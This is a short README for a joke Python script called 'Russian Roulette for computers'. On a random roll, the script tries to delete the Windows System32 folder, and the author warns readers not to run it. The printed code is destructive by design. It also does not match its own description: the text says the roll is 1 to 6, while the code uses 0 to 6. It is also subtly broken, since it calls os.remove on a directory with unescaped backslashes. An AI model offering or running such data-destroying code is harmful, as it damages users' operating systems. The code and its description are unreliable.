# Russian-Roulette-for-computers-
DO NOT RUN THIS UNDER ANY MEANS. Basically it's a python random number generator between 1 and 6 if it rolls a 1 then System 32 is getting deleted. I will provide the code in the README instead of making it a file and risking somebody accidentally running it. (I am not responsible for any lost or damaged Operating Systems)
# Code:

import random

import os

if random.randint(0, 6) == 1:
  
  os.remove("C:\Windows\System32")
